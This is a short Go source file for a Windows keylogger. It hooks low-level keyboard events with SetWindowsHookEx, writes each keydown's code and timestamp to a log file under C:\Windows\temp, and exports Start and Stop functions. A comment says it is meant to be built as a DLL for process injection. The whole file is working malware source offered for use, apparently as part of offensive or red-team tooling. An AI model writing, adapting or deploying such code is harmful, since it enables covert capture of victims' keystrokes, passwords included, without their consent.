// Basic userland keylogger using windows hooks on KEYBOARD_LL. This is intended
// to be compiled as a DLL for use in process-injection techniques.
package main

import (
	"C"
	"fmt"
	"github.com/gonutz/w32/v2"
	"os"
	"unsafe"
)

type Keylogger struct {
	OutputFile string
	hookHandle w32.HHOOK
	file *os.File
}

//export Start
// Will create a hook on WH_KEYBOARD_LL and write the events to the provided out file.
// Returns the handle to the hook and an error (if present)
func Start(fileOut string) (uintptr, error) {
	var kl Keylogger
	fh, err := os.OpenFile(fileOut, os.O_RDWR | os.O_CREATE | os.O_APPEND, 0666)
	if err != nil {
		return uintptr(0), err
	}

	kl.file = fh

	//TODO:use ntusersetwindowshookex
	handle := w32.SetWindowsHookEx(w32.WH_KEYBOARD_LL, func(code int, wParam w32.WPARAM, lParam w32.LPARAM) w32.LRESULT {
		if code == 0 && wParam == w32.WM_KEYDOWN {
			event := (*w32.KBDLLHOOKSTRUCT)(unsafe.Pointer(lParam))
			eventStr := fmt.Sprintf("Key Pressed: %d %q\n", event.Time, event.VkCode)
			_, _ = kl.file.Write([]byte(eventStr))
		}

		return w32.CallNextHookEx(kl.hookHandle, code, wParam, lParam)
	}, 0, 0)

	kl.hookHandle = handle

	var msg w32.MSG
	for w32.GetMessage(&msg, 0, 0, 0) != 0 {
		w32.TranslateMessage(&msg)
		w32.DispatchMessage(&msg)
	}

	return uintptr(handle), nil
}

//export Stop
// Attempts to unhook the windows hook using the handle from the Start method.
func Stop(handle uintptr) {
	_ = w32.UnhookWindowsHookEx(w32.HHOOK(handle))

}

func main() {
	_, _ = Start("C:\\Windows\\temp\\keylogger.out")
}
